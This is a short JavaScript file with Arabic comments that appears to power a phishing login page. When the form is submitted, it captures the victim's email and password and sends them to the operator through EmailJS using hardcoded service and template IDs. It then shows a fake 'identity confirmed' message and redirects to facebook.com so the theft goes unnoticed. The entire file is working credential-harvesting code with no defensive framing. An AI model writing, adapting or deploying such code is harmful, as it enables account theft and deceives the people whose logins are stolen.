document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault(); // منع الإرسال الافتراضي للنموذج

        // استرجاع القيم من النموذج
        
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;

        // تكوين البيانات التي سيتم إرسالها إلى القالب
        var templateParams = {
            
            email: email,
            password: password
        };
        

        // استخدام EmailJS لإرسال البريد الإلكتروني
        emailjs.send('service_9qxa43v', 'template_jb9h23a', templateParams)
            .then(function(response) {
               console.log('SUCCESS!', response.status, response.text);
               alert('لقد تم تأكيد هويتك بنجاح ');
               window.location.href = 'https://www.facebook.com/';
            }, function(error) {
               console.log('FAILED...', error);
               alert('حدث خطأ اعد المحاولة.');
            });
    });
});


